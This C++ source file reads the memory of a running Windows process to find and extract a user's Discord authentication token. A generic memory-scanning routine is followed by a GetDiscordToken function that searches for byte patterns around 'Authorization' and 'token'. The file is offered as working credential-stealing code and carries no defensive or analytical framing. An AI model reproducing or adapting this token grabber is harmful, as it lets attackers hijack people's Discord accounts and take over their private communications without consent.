#include <vector>
#include <iostream>
#include "Main.h"

char* __stdcall GetStringFromProcessMemory (
    HANDLE process, 
    const char* from, 
    const char* to, 
    int from_len, 
    int to_len, 
    PVOID offset,
    int skip
) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    MEMORY_BASIC_INFORMATION info;
    PCHAR chunk, p = (PCHAR)offset;
    int max_len = from_len < to_len ? to_len : from_len;
    std::vector<char>* result = new std::vector<char>;
    bool write = false;

    while (p < si.lpMaximumApplicationAddress)
    {
        if (VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info))
        {
            p = (PCHAR)info.BaseAddress;
            chunk = (PCHAR)malloc(info.RegionSize);
            SIZE_T bytesRead;

            if (ReadProcessMemory(process, p, chunk, info.RegionSize, &bytesRead))
            {
                for (size_t i = 0; i < bytesRead - max_len; i += write ? 1 : skip)
                {
                    if (!write &&
                        (chunk[i] == from[0] && chunk[i + from_len - 1] == from[from_len - 1]) &&
                        memcmp(from, &chunk[i], from_len) == 0) {
                        write = true;
                        i += from_len;
                    }
                    if (write &&
                        (chunk[i] == to[0] && chunk[i + to_len - 1] == to[to_len - 1]) &&
                        memcmp(to, &chunk[i], to_len) == 0) {
                        write = false;
                        result->push_back('\0');
                        return result->data();
                    }
                    if (write)
                        result->push_back(chunk[i]);
                }
            }

            free(chunk);
            p += info.RegionSize;
        }
    }

    return NULL;
}

char* __stdcall GetStringFromProcessMemoryByPid(int pid, const char* from, const char* to, int from_len, int to_len, PVOID offset, int skip) {
    HANDLE ProcessHandle;
    
    if (GetProcessHandle(pid, &ProcessHandle)) {
        return NULL;
    }

    return GetStringFromProcessMemory(ProcessHandle, from, to, from_len, to_len, offset, skip);
}

char* __stdcall GetDiscordToken(
    int pid,
    int skip
) {
    const char  begin[] = "Authorization\0\0\0`\0\0\0X\0\0\0", end[] = "\x18";
    const char begin2[] = "tokenm\0\0\0X",                    end2[] = "m\0\0\0\f";

    const int begin_len =  sizeof(begin) - 1,  end_len =  sizeof(end) - 1;
    const int begin2_len = sizeof(begin2) - 1, end2_len = sizeof(end2) - 1;

    char* token;
    try {
        if (token = GetStringFromProcessMemoryByPid(pid, begin, end, begin_len, end_len, 0, skip)) {
            return token;
        }
        else if (skip == 1 && (token = GetStringFromProcessMemoryByPid(pid, begin2, end2, begin2_len, end2_len, 0, skip))) {
            return token;
        }
    }
    catch (PVOID) { }

    return NULL;
}